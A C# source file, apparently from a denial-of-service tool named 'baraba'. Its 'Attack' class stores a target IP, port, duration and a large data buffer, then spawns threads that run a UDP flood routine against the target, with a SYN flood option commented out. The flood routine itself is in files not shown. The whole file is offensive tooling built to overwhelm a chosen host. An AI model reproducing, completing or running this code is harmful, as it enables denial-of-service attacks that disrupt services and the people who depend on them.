using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Threading;
using System.Diagnostics;
using baraba.Methods;
using baraba.Network;

namespace baraba
{
    class Attack
    {
        private struct Me
        {
            public static bool IsFlooding;
            public static string IpAddress;
            public static int Port, Time;
            public static byte[] Data;
        }

        /// <summary>
        /// Return Data Of Current Attack.
        /// </summary>
        public static byte[] GetCurrentData()
        {
            return Me.Data;
        }

        /// <summary>
        /// Return Target-IpAddress Of Current Attack.
        /// </summary>
        public static string GetCurrentIpAddress()
        {
            return Me.IpAddress;
        }

        /// <summary>
        /// Return Target-Port Of Current Attack.
        /// </summary>
        public static int GetCurrentPort()
        {
            return Me.Port;
        }

        /// <summary>
        /// Toggle Status Of Current Attack.
        /// </summary>
        public static void SetFloodingStatus(bool mode)
        {
            Me.IsFlooding = mode;
        }

        /// <summary>
        /// Return Status Of Current Attack.
        /// </summary>
        public static bool GetFloodingStatus()
        {
            return Me.IsFlooding;
        }

        public static void Setup(string Method, string IpAddress, int Port, int Time, int Threads = 1)
        {
            // Edit Settings
            Me.IpAddress = IpAddress;
            Me.Port = Port;
            Me.Time = Time;
            // Create Data
            Me.Data = new byte[35555];

            // Start Timer
            Timer Timer = new Timer(Time);

            // Setup Threads
            for (int i = 0; i <= Threads; i++)
            {
                Debug.Print("New Thread Started.");
                if((Method.ToLower() == "udp"))
                    new Thread(Udp.Begin).Start();
                //if ((Method.ToLower() == "syn"))
                  //  new Thread(Syn.Begin).Start();
            }
        }
    }
}
